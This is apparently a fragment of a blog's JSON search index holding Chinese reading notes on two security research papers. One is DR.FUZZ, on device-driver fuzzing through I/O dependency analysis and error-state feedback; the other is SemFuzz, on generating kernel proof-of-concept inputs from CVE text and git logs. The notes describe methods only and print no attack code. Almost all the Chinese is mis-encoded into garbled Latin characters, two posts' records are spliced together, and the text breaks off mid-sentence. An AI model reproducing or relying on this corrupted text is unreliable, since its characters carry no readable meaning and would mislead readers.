æ–¹æ³•ï¼šä½œè€…è®¤ä¸ºéªŒè¯é“¾å…·æœ‰ç‰¹å®šçš„æ¨¡å¼â€”â€”æ˜¯å¦ä¸ºæ¡ä»¶è¯­å¥ï¼Œæ˜¯å¦å…·æœ‰åˆ†æ”¯ã€‚ï¼ˆå›¾äº”å³ä¾§ï¼‰å¾—åˆ°å…³é”®å­—æ®µåï¼Œä½œè€…å°†éªŒè¯è§†ä¸ºå­—æ®µçº¦æŸï¼Œä½¿ç”¨é™æ€çš„è¿‡ç¨‹é—´å’Œå­—æ®µæ•æ„Ÿçš„æ•°æ®æµåˆ†ææ¥æ”¶é›†å­—æ®µçš„çº¦æŸã€‚ æ¢è¨€ä¹‹ï¼ŒåŸºäºä¸Šé¢æ„å»ºçš„ I/O ä¾èµ–å›¾ï¼Œåˆ†æå¹¶æ”¶é›†å›¾ä¸­å…³é”®å­—æ®µç›¸å…³çš„åˆ†æ”¯æ¡ä»¶ï¼Œå¾—åˆ°å¯èƒ½çš„æœ‰æ•ˆå€¼ã€‚ I/O åœ°å€-å­—æ®µæ˜ å°„ å¤„ç†ç¡¬ç¼–ç æ˜ å°„ã€‚ ç›®çš„ï¼šä¸Šé¢çš„æ­¥éª¤åªæ˜¯çŸ¥é“äº†å…³é”®å­—æ®µå’Œå…³é”®å­—æ®µå¯¹åº”çš„å¯èƒ½å€¼ï¼Œé‚£ä¹ˆ fuzzer å¦‚ä½•å°†å€¼å¡«åˆ°ç›¸åº”å­—æ®µå‘¢ï¼Œå°±è¦æ‰¾å¯¹åº” I/O åœ°å€ã€‚ æ–¹æ³•ï¼šåŒæ ·åˆ©ç”¨ I/O ä¾èµ–å›¾æ¥æ‰¾åˆ°å­—æ®µçš„æ¥æºâ€”â€”å¡«å……è¯¥å­—æ®µçš„ I/O æŒ‡ä»¤ï¼Œæ­¤æŒ‡ä»¤çš„æºæ“ä½œæ•°æ˜¯è¯¥å­—æ®µå¯¹åº”çš„ I/O åœ°å€ã€‚ å¤„ç†åŠ¨æ€æ˜ å°„ é™¤äº†å…·æœ‰ç¡¬ç¼–ç  I/O åœ°å€çš„å­—æ®µå¤–ï¼Œè¿˜æœ‰ä¸€äº›å­—æ®µçš„å¯¹åº” I/O åœ°å€æ˜¯åŠ¨æ€ç”Ÿæˆçš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»…é é™æ€åˆ†ææ— æ³•è®¡ç®—å‡º I/O åœ°å€ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§åŠ¨æ€åœ°å€æ˜ å°„æŠ€æœ¯ã€‚åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå¦‚æœ DR. FUZZ æ²¡æœ‰åœ¨æ­£ç¡®çš„ I/O åœ°å€å‡†å¤‡æ­£ç¡®çš„å€¼ï¼Œåˆ™å¿…é¡»æœ‰ä¸€ä¸ªé”™è¯¯çŠ¶æ€ (å³å¤±è´¥)ï¼Œè¯¥çŠ¶æ€å°†ä½œä¸ºåé¦ˆæ”¶é›†åœ¨ DR. FUZZ ä¸­ã€‚æˆ‘ä»¬å°†é”™è¯¯çŠ¶æ€ä¿¡æ¯è®¾è®¡ä¸ºåŒ…å«ä¸€ä¸ªå°†åé¦ˆç»™æ¨¡ç³Šå™¨çš„ç‰¹æ®Šå‚æ•°ã€‚è¯¥å‚æ•°åŒ…æ‹¬å¯¼è‡´åˆå§‹åŒ–å¤±è´¥çš„å…³é”®å­—æ®µä¿¡æ¯ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆå¯¹å…³é”®å­—æ®µè¿›è¡Œç¼–å·ï¼Œç„¶ååœ¨è·¯å¾„çŠ¶æ€åé¦ˆæœŸé—´ä½¿ç”¨ä»£ç æ’è£…å°†æ•°å­—å†™å…¥ç›¸å…³å¯„å­˜å™¨ï¼Œä»¥å®Œæˆå‚æ•°ä¼ è¾“ã€‚å…³äºé”™è¯¯çŠ¶æ€åé¦ˆçš„æ›´å¤šç»†èŠ‚å°†åœ¨Â§IV-B1 ä¸­ä»‹ç»ã€‚\nå­—èŠ‚ä¼˜å…ˆæ¨æ–­ ä¸Šé¢çš„æŠ€æœ¯è™½ç„¶ä¹Ÿå‡å°äº†è¾“å…¥ç©ºé—´ï¼Œä½†æ˜¯ï¼Œé¦–å…ˆï¼Œå®ƒçš„ç»“æœå¯èƒ½ä¸ç²¾ç¡®ï¼Œæ‰€ä»¥æ¨¡ç³Šå™¨ä»ç„¶éœ€è¦æµ‹è¯•å®ƒä»¬ã€‚ç¬¬äºŒï¼Œç”±äºç¼ºä¹è¯­ä¹‰ä¿¡æ¯ï¼Œéƒ¨åˆ†è¾“å…¥æ— æ³•æ¨æ–­ã€‚\néªŒè¯é“¾çš„æ—¶åºæ¨¡å¼ éªŒè¯é“¾éµå¾ªç‰¹å®šçš„æ—¶é—´æ¨¡å¼ã€‚\né¦–å…ˆï¼Œä»è¯»å–è®¾å¤‡å¼€å§‹æ‰§è¡Œä»£ç ã€‚è¯»å–ä» I/O åœ°å€ (AddrV) è·å¾—ä¸€ä¸ªå€¼ (V)ã€‚ å…¶æ¬¡ï¼Œå€¼ (V) å°†è¢«ç”¨ä½œæºæ“ä½œæ•°å’Œä½æ©ç ï¼Œç”¨äºä½æ“ä½œï¼Œä»¥ç”Ÿæˆæ–°çš„ä¸­é—´å€¼ (I = V \u0026amp;bitmask)ã€‚ ç¬¬ä¸‰ï¼Œè¿™ä¸ªå€¼ (I) å°†åœ¨ä½¿ç”¨å€¼ (V) ä¹‹å‰è¿›è¡ŒéªŒè¯ã€‚ ç¬¬å››ï¼Œä½¿ç”¨å€¼ã€‚åœ¨è¿™ç§æ‰§è¡Œæ¨¡å¼ä¸­ï¼Œå€¼ (V) è¢«è¯»å…¥ä¸€æ¬¡ï¼Œä½†éšåä¼šè¢«å¼•ç”¨ã€‚ æå–æ—¶åº ä¸ºäº†æå–å­—èŠ‚ä¼˜å…ˆçº§è¯­ä¹‰ï¼Œæˆ‘ä»¬éœ€è¦å°†å­—æ®µä¸æ—¶æ€æ¨¡å¼åŒ¹é…ã€‚ æˆ‘ä»¬æ£€æŸ¥ I/O ä¾èµ–å›¾ä¸­çš„èŠ‚ç‚¹ï¼Œå¹¶é’ˆå¯¹èŠ‚ç‚¹è¯†åˆ«ç›¸å…³æ“ä½œï¼ŒåŒ…æ‹¬ä½æ©ç ã€éªŒè¯å’Œä½¿ç”¨æƒ…å†µï¼Œå¾—åˆ°ä½¿ç”¨å­—æ®µçš„æ—¶é—´é¡ºåºã€‚ ç„¶åé‡ç”¨Â§IV-A2 ä¸­æ„é€ çš„ I/O åœ°å€å­—æ®µæ˜ å°„ï¼Œæœ€ç»ˆæ¢å¤è¾“å…¥ä¸­å­—èŠ‚çš„ä¼˜å…ˆçº§\nB è¯­ä¹‰ informing B.1è·¯å¾„çŠ¶æ€ä½œä¸ºæ¨¡ç³Šåé¦ˆ æˆ‘ä»¬å°†çŠ¶æ€åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œæ­£å¸¸çŠ¶æ€æˆ–é”™è¯¯çŠ¶æ€ã€‚æ­£å¸¸çŠ¶æ€æ˜¯æŒ‡åˆå§‹åŒ–ä»£ç è·¯å¾„ä»ç„¶å¯ä»¥è¢«è¾“å…¥è§¦å‘ï¼Œè€Œé”™è¯¯çŠ¶æ€æ˜¯æŒ‡é©±åŠ¨ç¨‹åºå·²ç»è¿›å…¥æ•…éšœçŠ¶æ€ï¼Œå¦‚æœ fuzzer æ²¿ç€æ–¹å‘ç»§ç»­ï¼Œåˆå§‹åŒ–å°†æ— æ³•è¿›è¡Œã€‚\né”™è¯¯ä½ç½® é”™è¯¯çŠ¶æ€åé¦ˆå¯ä»¥ä¸ºæ¨¡ç³Šå™¨æä¾›ä»¥ä¸‹æœ‰ç”¨çš„ä¿¡æ¯ã€‚\nfuzzer å¯ä»¥å°½å¿«çŸ¥é“é©±åŠ¨åˆå§‹åŒ–å¤±è´¥äº† fuzzer å¯ä»¥æ›´å‡†ç¡®åœ°çŸ¥é“æ˜¯å“ªä¸ªè¾“å…¥å¯¼è‡´äº†åˆå§‹åŒ–å¤±è´¥ï¼Œè¿™å¯ä»¥ä½¿ fuzzer åœ¨é€‰æ‹©ä¸‹ä¸€ä¸ªè¾“å…¥æ—¶æ›´æœ‰æ•ˆã€‚ ä½œè€…æŒ‡å‡ºå½“é©±åŠ¨ç¨‹åºæ‰§è¡Œå¤±è´¥çš„æ—¶å€™ï¼Œä¸Šæ¸¸æ”¶åˆ°çš„è¿”å›å€¼æ˜¯éé›¶å€¼ï¼Œæ‰€ä»¥ä½¿ç”¨é©±åŠ¨ç¨‹åºå‡½æ•°çš„éé›¶è¿”å›å€¼ä½œä¸ºæ ‡å¿—æ¥æŒ‡ç¤ºé©±åŠ¨ç¨‹åºçš„é”™è¯¯çŠ¶æ€ã€‚ æ”¶é›†é”™è¯¯çŠ¶æ€ é¦–å…ˆæ”¶é›†é©±åŠ¨å‡½æ•°è¿”å›é”™è¯¯çš„ä½ç½®ï¼Œåœ¨è¿™äº›ä½ç½®æ’å…¥ä¸€å°æ®µ vmcall ä»£ç  é©±åŠ¨å‘ç”Ÿé”™è¯¯åï¼Œè¿™æ®µä»£ç è®©ç³»ç»Ÿé€€å‡ºï¼ŒDR. FUZZ é€šçŸ¥ fuzzerï¼Œä¼ é€’åŒ…å«æœ‰ç”¨ä¿¡æ¯çš„å‚æ•°ç»™çŠ¶æ€åˆ†æå™¨ æ­¤å‚æ•°å¯ä»¥æŒ‡ç¤ºè¾“å…¥æ˜¯å¦æ»¡è¶³æœŸæœ›å€¼ï¼ŒçŠ¶æ€åˆ†æå™¨ä½¿ç”¨æ­¤å‚æ•°æç¤ºå­—èŠ‚ä¼˜å…ˆçº§çªå˜ï¼Œä»¥ä¾¿ä¸ºä¸‹ä¸€ä¸ªè¾“å…¥æ”¹è¿›çªå˜ã€‚ B.2 æ–°å˜å¼‚ç­–ç•¥ ä»£ç è¦†ç›–ç‡å¼•å¯¼å’Œé”™è¯¯çŠ¶æ€å¼•å¯¼ä¸¤ç§ç­–ç•¥äº¤æ›¿ä½¿ç”¨ï¼Œåœ¨é©±åŠ¨åˆå§‹åŒ–çš„é˜¶æ®µä½¿ç”¨é”™è¯¯çŠ¶æ€å¼•å¯¼ï¼Œå½“åœ¨é”™è¯¯çŠ¶æ€åé¦ˆä¸‹æ²¡æœ‰è¿›å±•åï¼Œè½¬ç§»åˆ°ä»£ç è¦†ç›–å¼•å¯¼ã€‚\nå®æ–½ åŸºäº LLVM å®ç°è¯­ä¹‰åˆ†æå’Œæ’æ¡©ï¼ŒåŸºäº syzkaller å®ç°è¯­ä¹‰é€šçŸ¥æœºåˆ¶ã€‚\nè®¾å¤‡é€‚é…å™¨\næˆ‘ä»¬åœ¨ QEMU ä¸­å°†é€‚é…å™¨ä½œä¸ºä¸€ä¸ªæ¨¡å—æ¥å®ç°ã€‚é€‚é…å™¨å‘ QEMU çš„ VM å‡ºå£å¤„ç†ç¨‹åºæ³¨å†Œä¸€äº› I/O å¤„ç†ç¨‹åº; è¿™äº›å¤„ç†ç¨‹åºè§£æç”±äºè®¿é—®é€‚é…å™¨çš„ IO ç«¯å£/MMIO/DMA åœ°å€è€Œå¯¼è‡´çš„é€€å‡ºäº‹ä»¶ã€‚æ¥è‡ªå®¢æˆ·æ“ä½œç³»ç»Ÿå†…æ ¸çš„æ¯ä¸ªè¯»/å†™æ“ä½œéƒ½è¢«åˆ†æ´¾åˆ°é€‚é…å™¨æä¾›çš„æ³¨å†Œå‡½æ•°ã€‚åŒæ—¶ï¼Œé€‚é…å™¨åˆ›å»ºå¤šä¸ª memoryregion ç”¨äºå°† fuzzer è¾“å‡ºä¼ é€’åˆ°ç›®æ ‡ I/O åœ°å€ã€‚é€‚é…å™¨é€šè¿‡æ–‡ä»¶å¥—æ¥å­—è¯»å–æ¨¡ç³Šç”Ÿæˆçš„æ•°æ®ï¼Œå¹¶å°†å€¼å†™å…¥ MemoryRegionsã€‚ ç”¨æˆ·æ¨¡å¼ä»£ç†\nå®ƒçš„å®ç°æ˜¯ç‰¹å®šäºè®¾å¤‡çš„; å³æ ¹æ®å…·ä½“è®¾å¤‡çš„åŠŸèƒ½æä¾›ç›¸åº”çš„æ¨¡ç³Šé€»è¾‘ã€‚å› æ­¤ï¼Œå…¶æ¨¡ç³Šé€»è¾‘åº”ç”±é©±åŠ¨æµ‹è¯•äººå‘˜æä¾›ã€‚ä»£ç†çš„å®ç°å¯ä»¥ç¡®å®šå®ƒæ˜¯å¦å¯ä»¥è§¦å‘é©±åŠ¨ç¨‹åºæä¾›çš„ä¸€äº›åŠŸèƒ½ã€‚ç”±äºä»£ç†çš„å…·ä½“å®ç°ä¸æ˜¯æˆ‘ä»¬çš„é‡ç‚¹ï¼Œå› æ­¤æˆ‘ä»¬é‡ç”¨ syzkaller çš„ syscall ç”Ÿæˆå™¨æ¥è‡ªåŠ¨ç”Ÿæˆç”¨æˆ·æ¨¡å¼ä»£ç†ã€‚ è¯­ä¹‰åˆ†æ\né¦–å…ˆé…ç½®å†…æ ¸ä»¥å¯ç”¨è®¾å¤‡é©±åŠ¨ç¨‹åº ç”Ÿæˆé©±åŠ¨ç¨‹åºä»£ç çš„ IR æ–‡ä»¶ã€‚è¿™äº› IR æ–‡ä»¶å°†é€šè¿‡ LLVM pass è¿›è¡Œåˆ†æã€‚ LLVM pass å°†è¯­ä¹‰ä¿¡æ¯è¾“å‡ºåˆ°è¯­æ–™åº“æ–‡ä»¶ã€‚fuzzer æ ¹æ®è¿™ä¸ªæ–‡ä»¶ç”Ÿæˆé€‚å½“çš„å€¼ä½œä¸ºè®¾å¤‡è¾“å‡ºã€‚ è™šæ‹Ÿæœºå¿«ç…§\nåœ¨æ¨¡ç³ŠåŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸¤ä¸ªè™šæ‹Ÿæœºå¿«ç…§ã€‚ç¬¬ä¸€ä¸ªæ˜¯åœ¨è®¾å¤‡åˆå§‹åŒ–é˜¶æ®µã€‚ä¸ºäº†æé«˜ååé‡ï¼Œæˆ‘ä»¬è·³è¿‡äº†ä¸€äº›ä¸å†…æ ¸ç›¸å…³çš„åˆå§‹åŒ–ä»£ç ã€‚æˆ‘ä»¬åœ¨å®é™…çš„æ€»çº¿æ‰«æå¼€å§‹æ—¶åˆ›å»ºä¸€ä¸ªå¿«ç…§ã€‚å½“ fuzzer æ”¶åˆ°é”™è¯¯åé¦ˆæ—¶ï¼Œæˆ‘ä»¬ä»å¿«ç…§é‡æ–°å¼€å§‹æ‰§è¡Œã€‚ ç¬¬äºŒä¸ªå¿«ç…§æ˜¯åœ¨è®¾å¤‡é©±åŠ¨ç¨‹åºåˆå§‹åŒ–ä¹‹å; ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç›¸å…³æ¢æµ‹å‡½æ•°æˆåŠŸæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬å°†åˆ›å»ºç”¨æˆ·æ¨¡å¼ä»£ç†çš„å®é™…ç‚¹çš„å¿«ç…§ï¼Œè¿™æ ·ç”¨æˆ·ç©ºé—´ç¨‹åºå°±å¯ä»¥æ›´å¿«åœ°æ‰§è¡Œï¼Œè€Œæ— éœ€é‡æ–°æ‰§è¡Œå†…æ ¸ã€‚ è¯„ä»· A é©±åŠ¨åˆå§‹åŒ–çš„æ•ˆç‡ DRFUZZ å¯ä»¥æˆåŠŸ match æ‰€æœ‰çš„é©±åŠ¨ç¨‹åºï¼Œåˆå§‹åŒ–æˆåŠŸ 70%çš„ç¨‹åºã€‚ I2C æ€»çº¿çš„é©±åŠ¨ç¨‹åºåˆå§‹åŒ–æˆåŠŸç‡è¾ƒé«˜ï¼Œå› ä¸ºåè®®æ¯”è¾ƒç®€å•ï¼Œå¯¹äºå…¶ä»–åè®®ä½œè€…æŒ‡å‡ºå†ç»™ 3 ä¸ªå°æ—¶ï¼ˆå®éªŒè®¾å®š 24 ä¸ªå°æ—¶ï¼‰å¯ä»¥å†æˆåŠŸåˆå§‹åŒ– 6 ä¸ª ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œå€¼æ¨æ–­åªèƒ½å®Œæˆéƒ¨åˆ†é©±åŠ¨ç¨‹åºçš„åˆå§‹åŒ–ã€‚è™½ç„¶å€¼æ¨æ–­åœ¨åŒ¹é…ä¸­æ˜¯æœ‰æ•ˆçš„ï¼Œä½†å®ƒåœ¨å®Œæˆæ•´ä¸ªåˆå§‹åŒ–æ—¶æ˜¯æ— æ•ˆçš„â€”â€”ä»…å€¼æ¨æ–­ä¸èƒ½æˆåŠŸåœ°åˆå§‹åŒ–ã€‚åœ¨å­—èŠ‚ä¼˜å…ˆçº§æŠ€æœ¯çš„å¸®åŠ©ä¸‹ï¼ŒåŒ¹é…äº†æ›´å¤šçš„è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚ç„¶è€Œï¼Œå¦‚æœæ²¡æœ‰çŠ¶æ€åé¦ˆçš„å¸®åŠ©ï¼Œä»…é å­—èŠ‚ä¼˜å…ˆçº§å¾ˆéš¾äº§ç”Ÿå¾ˆå¥½çš„ç»“æœï¼Œåªæœ‰åœ¨åŒæ—¶å¯ç”¨è¿™ä¸‰è€…æ—¶æ‰èƒ½äº§ç”Ÿæœ€å¥½çš„ç»“æœã€‚\nç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semantic-informed-driver-fuzzing-without-both-the-hardware-devices-and-the-emulators/","summary":"ä¸­æ–‡è¯‘åï¼šä¸éœ€è¦ç¡¬ä»¶è®¾å¤‡å’Œæ¨¡æ‹Ÿå™¨çš„è¯­ä¹‰é©±åŠ¨æ¨¡ç³Š ä½œè€…ï¼šWenjia Zhao å•ä½ï¼šè¥¿å®‰äº¤é€šå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #NDSSä¼šè®® å…³é”®å­—","title":"Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators"},{"content":"ä¸­æ–‡è¯‘åï¼šSemFuzz:åŸºäºè¯­ä¹‰çš„æ¦‚å¿µéªŒè¯æ¼æ´è‡ªåŠ¨ç”Ÿæˆ ä½œè€…ï¼šwei you btw äºŒä½œå’Œä¸‰ä½œæ˜¯ IIEï¼Œä¸‰ä½œæ˜¯é™ˆå‡¯ å•ä½ï¼šå°ç¬¬å®‰çº³å¤§å­¦ä¼¯æ˜é¡¿åˆ†æ ¡ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2017å¹´ æ¥æºï¼š #ccs\nå…³é”®å­—ï¼š #fuzzing #å®šå‘fuzzing #generate_poc ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-04-10 09:47\næ‘˜è¦ æå‡º semfuzzï¼Œåˆ©ç”¨æ¼æ´ç›¸å…³æ–‡æœ¬ï¼ˆä¾‹å¦‚ï¼ŒCVE æŠ¥å‘Šå’Œ Linux git æ—¥å¿—ï¼‰æ¥æŒ‡å¯¼ PoC çš„è‡ªåŠ¨ç”Ÿæˆ åŸºäº NLP æ¥è¿›è¡Œä¿¡æ¯æå– åŸºäºè¯­ä¹‰çš„æ¨¡ç³Šå¤„ç†æ¥ç”Ÿæˆ PoC SemFuzz è¿è¡Œäº†è¿‡å»äº”å¹´æŠ¥å‘Šçš„112ä¸ª Linux å†…æ ¸ç¼ºé™·ï¼ŒæˆåŠŸè§¦å‘äº†å…¶ä¸­çš„18ä¸ªï¼Œå¹¶è¿›ä¸€æ­¥å‘ç°äº†ä¸€ä¸ªé›¶æ—¥æ¼æ´å’Œä¸€ä¸ªæœªå…¬å¼€çš„æ¼æ´ã€‚ æ€ä¹ˆæ„Ÿè§‰æˆåŠŸè§¦å‘çš„æœ‰ç‚¹å°‘å•Š\nInstruction æ¼æ´çš„ CVE æŠ¥å‘Šï¼ŒLinux git æ—¥å¿—ã€è®ºå›å’Œåšå®¢ä¸Šå‘å¸ƒçš„é”™è¯¯æè¿°éƒ½å¯ä»¥ç”¨æ¥å¸®åŠ©è‡ªåŠ¨ç”Ÿæˆ PoC\nä»æ”»å‡»æ–¹è§’åº¦æ¥è¯´å¦‚ä½•å»åˆ©ç”¨è¿™äº›ä¿¡æ¯ ä»é˜²å®ˆæ–¹è§’åº¦æ¥è¯´ï¼Œå¦‚ä½•æ§åˆ¶è¿™äº›ä¿¡æ¯çš„æ³„éœ² è‡ªåŠ¨ç”Ÿæˆ exploit çš„æŒ‘æˆ˜ è‡ªåŠ¨ç”Ÿæˆ exp å¾ˆå›°éš¾ï¼Œç›®å‰èƒ½å¤Ÿå®ç°çš„éƒ½æ˜¯é’ˆå¯¹ä¸€äº›ç®€å•çš„è¾“å…¥éªŒè¯ç±»çš„æ¼æ´ã€‚å…¶ä»–ç±»å‹çš„æ¼æ´ (å¦‚ä¸å—æ§åˆ¶çš„èµ„æºæ¶ˆè€—ã€æ­»é”ã€å†…å­˜æŸåç­‰)çš„ exp è‡ªåŠ¨ç”Ÿæˆè¿‡äºå¤æ‚ï¼Œç›®å‰ï¼ˆ2017 å¹´å‰ï¼‰è¿˜æ²¡äººåšã€‚ ç›®å‰çš„æ–¹æ³•ä¸»è¦å°±æ˜¯ç¬¦å·æ‰§è¡Œæ‰¾åˆ°çº¦æŸï¼Œæ±‚è§£çº¦æŸ ä½†æ˜¯å°±ç®—æ˜¯ç®€å•çš„è¾“å…¥éªŒè¯ç±»æ¼æ´ï¼Œç¬¦å·æ‰§è¡Œå’Œçº¦æŸæ±‚è§£ä¹Ÿæ˜¯å›°éš¾çš„ã€‚å› ä¸ºç°å®ä¸–ç•Œçš„ç¨‹åºçš„æ¼æ´çš„è·¯å¾„çº¦æŸå¾€å¾€æ˜¯éçº¿æ€§çš„ï¼Œå¢å¤§äº†æ±‚è§£éš¾åº¦ æœ¬æ–‡æ–¹æ³• åˆ©ç”¨ä¸æ¼æ´ç›¸å…³çš„éä»£ç æ–‡æœ¬ï¼Œç‰¹åˆ«æ˜¯ CVE æŠ¥å‘Šå’Œ Linux git æ—¥å¿—ï¼Œæ¥æå–æŒ‡å—ï¼Œè¿™äº›æŒ‡å—è¢«è®¤ä¸ºæ˜¯æœ‰åŠ©äºå‘ç°å’Œè§¦å‘ä¸€ç»„æ·±å±‚é”™è¯¯çš„ä¿¡æ¯ã€‚ æœ¬æ–‡çš„æŠ€æœ¯æ˜¯åŸºäºè¯­ä¹‰çš„æ¨¡ç³Šæµ‹è¯•ï¼Œè‡ªåŠ¨åˆ†æé”™è¯¯æŠ¥å‘Šï¼Œä»¥åœ¨ Linux å†…æ ¸æ¼æ´ä¸Šåˆ›å»ºç«¯åˆ°ç«¯çš„ PoC é¦–å…ˆåˆ©ç”¨ NLP æ¥åˆ†æ CVE å’Œ git æ—¥å¿—ï¼Œåˆ©ç”¨è¿™äº›ä¿¡æ¯æ¥åˆ›å»ºä¸€ä¸ªåˆ°è¾¾æ¼æ´å‡½æ•°çš„è°ƒç”¨åºåˆ— åˆ©ç”¨æ¨¡ç³Šæµ‹è¯•è¿­ä»£çš„è°ƒæ•´å„ä¸ªè°ƒç”¨çš„å‚æ•°ï¼Œä»¥ç§»åŠ¨åˆ°å‡½æ•°å†…éƒ¨çš„ä¿®è¡¥ä»£ç ï¼Œç›´åˆ°è§¦å‘æ¼æ´ã€‚ï¼ˆæˆ‘çš„ç†è§£å°±æ˜¯è¢«æµ‹ç¨‹åºå®é™…ä¸Šæ˜¯æ²¡æœ‰è¿™ä¸ªä¿®è¡¥ä»£ç çš„ï¼Œå·²ä¿®è¡¥çš„ç¨‹åºä¿®è¡¥ä»£ç çš„ä½ç½®å°±æ˜¯æœªä¿®è¡¥ç¨‹åºæ¼æ´çš„ä½ç½®ï¼‰ SemFuzz èƒ½å¤Ÿå¤„ç†å†…æ ¸ä»£ç ä¸­çš„å„ç§æ¼æ´ DESIGN OVERVIEW SemFUZZ ä¸»è¦æ˜¯ä¸¤ä¸ªæ­¥éª¤ï¼š\nè¯­ä¹‰ä¿¡æ¯æå– åŸºäºè¯­ä¹‰çš„ fuzzing ä¸Šå›¾æ˜¯ä¸ªç¤ºä¾‹ï¼Œå·¦ä¸Šæ–¹æ˜¯ CVE æè¿°ï¼Œå·¦ä¸‹æ–¹æ˜¯æ¼æ´çš„ git æ—¥å¿—ã€‚semfuzz é¦–å…ˆå¯åŠ¨å†…æ ¸å‡†å¤‡ fuzz ç¯å¢ƒï¼Œä½¿ç”¨ä»æè¿°ä¸­å‘ç°çš„æ¦‚å¿µ (å³â€œMSG MOREâ€ï¼Œâ€œloopbackâ€ï¼Œâ€œUDPâ€)æ„å»ºç§å­è¾“å…¥â€”â€”å°±æ˜¯å³ä¸Šçš„ system callã€‚åœ¨ fuzzing è¿‡ç¨‹ä¸­æ ¹æ®ä»è¡¥ä¸ä¸­æå–åˆ°çš„ä¿¡æ¯ï¼ˆcfgï¼‰å’Œç›‘æ§å…³é”®å˜é‡çš„åé¦ˆå¯¹è¾“å…¥è¿›è¡Œå˜å¼‚ï¼Œç›´åˆ°è§¦å‘æ¼æ´ã€‚ è¯´æ˜ã€‚ è¯­ä¹‰ä¿¡æ¯çš„æå– åŸºäºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²åŒ¹é…ç­‰è¯­æ³•æ‰‹æ®µç›´æ¥æå–ä¿¡æ¯çš„æ•ˆæœä¸å¥½ï¼Œæ²¡æœ‰è€ƒè™‘å•è¯ä¹‹é—´äº’ç›¸çš„ä¾èµ–æ€§ï¼Œæ²¡æœ‰è€ƒè™‘è¯­å¥çš„è¯­ä¹‰ã€‚ é‡‡ç”¨ NLPã€è¯æ€§æ ‡è®° POSã€çŸ­è¯­è§£æå’Œå¥æ³•è§£æï¼ŒSemFuzz æ„å»ºäº†ä¸€ä¸ªè§£ææ ‘æ¥è¯†åˆ«æ¯ä¸ªå•è¯çš„ POS æ ‡è®°ï¼Œå¹¶è¯†åˆ«å¥å­ä¸­çš„å¥æ³•å­å¥ä»¥è¿›è¡Œè¯­ä¹‰åˆ†æã€‚ ç”Ÿæˆè§£ææ ‘ ä½¿ç”¨ NLP å·¥å…· pyStatParser ä» Penn æ ‘åº“å­¦ä¹ æ¦‚ç‡ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ï¼Œå¹¶ä¸º CVE å’Œ git æ—¥å¿—ä¸­çš„æ¯ä¸ªå¥å­ç”Ÿæˆè§£ææ ‘ã€‚ä¸Šå›¾å³ä¸‹è§’å±•ç¤ºçš„å°±æ˜¯\u0026quot;the whole skb len is dangerous\u0026quot;çš„è¯­æ³•æ ‘ï¼Œæ¯ä¸ªå¶å­çš„çˆ¶èŠ‚ç‚¹æ˜¯å•è¯å¯¹åº”çš„ POS æ ‡è®°ã€‚\næå–å—å½±å“çš„ç‰ˆæœ¬ å…ˆåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼åœ¨ CVE å’Œ git æ—¥å¿—ä¸­è¯†åˆ«ç‰ˆæœ¬å·ï¼Œç„¶ååœ¨è§£ææ ‘ä¸­å®šä½åŒ…å«ç‰ˆæœ¬å·çš„å¥å­ã€‚å®šä½å¥å­ä¸»è¦æ˜¯ä¸ºäº†è¿‡æ»¤ä¿¡æ¯ï¼Œå› ä¸º SemFuzz æ˜¯å¯¹ Linux å†…æ ¸çš„ fuzzï¼Œæ‰€ä»¥åªæ‰¾ Linux çš„ç‰ˆæœ¬å·ï¼Œè¿‡æ»¤å…¶ä»–åº”ç”¨ç¨‹åºçš„ç‰ˆæœ¬å·ã€‚\næå–æ¼æ´ç±»å‹ ä½œè€…æ ¹æ® CWE ä¸º SemFuzz è®¾ç½®äº† 16 ç§æ¼æ´å€™é€‰ç±»å‹ï¼ŒSemFuzz åœ¨è§£ææ ‘ä¸­çš„ NPï¼ˆåè¯çŸ­è¯­ï¼‰èŠ‚ç‚¹ä¸­å¯»æ‰¾å€™é€‰ç±»å‹ï¼Œå¦‚æœæ²¡æœ‰æ‰¾ åˆ°ï¼Œå°±ç”¨ CVE ç¼–å·ä½œä¸ºå…³é”®å­—å» NVD ä¸­æœç´¢ Technical Details å­—æ®µå¾—åˆ°æ¼æ´ç±»å‹ã€‚\næå–æ¼æ´å‡½æ•° SemFuzz å°†æœªä¿®è¡¥çš„ Linux å†…æ ¸ç‰ˆæœ¬ä¸ä¿®è¡¥è¿‡çš„ Linux å†…æ ¸ç‰ˆæœ¬ (åœ¨ git æ—¥å¿—ä¸­è¡¨ç¤º)è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶å°†ä¿®æ”¹è¿‡çš„å‡½æ•°å®šä½ä¸ºå€™é€‰è„†å¼±å‡½æ•°ã€‚ é€šè¿‡ä»¥ä¸‹è§‚å¯Ÿè¿›ä¸€æ­¥å®šä½çœŸå®çš„æ¼æ´: (1)å¦‚æœåœ¨ CVE æè¿°ä¸­è¿˜æåˆ°äº†ä¸€ä¸ªä¿®è¡¥è¿‡çš„å‡½æ•°ï¼Œåˆ™è¯¥å‡½æ•°æ›´æœ‰å¯èƒ½æ˜¯æ¼æ´å‡½æ•°;(2)å¦‚æœ CVE 